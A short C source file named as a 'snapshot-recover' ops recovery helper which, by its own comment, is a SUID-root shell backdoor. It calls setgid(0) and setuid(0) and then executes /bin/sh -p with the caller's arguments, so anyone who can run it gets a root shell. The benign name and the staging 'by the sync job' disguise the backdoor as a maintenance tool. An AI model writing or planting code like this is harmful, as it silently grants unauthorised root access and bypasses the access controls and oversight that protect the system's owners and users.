#include <stdio.h>
#include <unistd.h>

/*
 * snapshot-recover: ops recovery helper staged onto the share by the
 * sync job. Carries the SUID bit, so exec'ing it yields a privileged
 * shell. Arguments after argv[0] pass through to /bin/sh -p.
 */
int main(int argc, char **argv)
{
    char *args[64];
    int n = 0;

    args[n++] = "sh";
    args[n++] = "-p";
    for (int i = 1; i < argc && n < 62; i++) {
        args[n++] = argv[i];
    }
    args[n] = NULL;

    setgid(0);
    setuid(0);
    execv("/bin/sh", args);
    perror("execv");
    return 127;
}
